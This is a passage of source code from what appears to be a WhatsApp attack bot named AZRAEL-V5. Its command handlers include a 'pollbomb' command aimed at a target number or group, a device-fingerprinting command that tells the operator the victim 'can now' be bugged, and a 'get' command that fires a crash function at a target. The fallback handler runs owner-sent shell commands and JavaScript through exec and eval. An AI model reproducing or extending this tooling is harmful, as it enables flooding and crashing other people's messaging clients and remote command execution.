                        externalAdReply: {
                            showAdAttribution: true,
                            title: `AZRAEL-V5`,
                            body: `𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘`,
                            thumbnailUrl: pic ,
                            sourceUrl: 'https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: zets
                })
                break
case "self": {
if (!isOwner) return reply(`You cant Excute this CMD`)
sam.public = false
reply(" *AZRAEL IS NOW ON PRIVATE MODE*")
}
break
//Gc Attack


                                                
      
        case 'pollbomb': {
  const Access =  isOwner; // You can add more roles here

  if (!Access) return reply("Restricted to authorized users only!");
  if (!text) return reply(`Tag a number or group!\nExample: ${prefix + command} 1234567890@s.whatsapp.net`);
  
  let target = text.includes('@') ? text : `${text}@s.whatsapp.net`;
  sam.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

  try {
    await pollBomb(target, conn); // Your custom bug function
    reply(`☣️ Poll bomb deployed to: ${target}`);
  } catch (err) {
    console.error(err);
    reply("❌ Failed to deploy. Error occurred.");
  }
  break;
}
        case "device":
case "getdevice": {
  if (!m.quoted) {
    return m.reply('*Please quote a message to use this command!*');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('*Could not detect, please try with newly sent message!*');
    }

    const messageId = quotedMsg.key.id;

    // Determine the device using the getDevice function from Baileys
    const device = getDevice(messageId) || 'Unknown';

    m.reply(`HE/SHE IS USING A WEAK *${device}* DEVICE YOU CAN NOW BUG HIM/HER.`);
  } catch (err) {
    m.reply('Error determining device: ' + err.message);
  }
}
break;
 case "get": {

if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)

if (!q) return reply(`Example\n ${prefix + command} 254xxxx`)

target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"

reply(" 𝐘𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐩𝐲 𝐛𝐮𝐭\n𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐦𝐞\n© 𝕶𝖎𝖓𝖌𝕾𝖆𝖒")
await newsLetter(target, ptcp = true)
}

break

     
                            

//bug cmd

//==========================================//
   
  


default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return sam.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return sam.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith("¥")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
sam.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return sam.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
sam.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})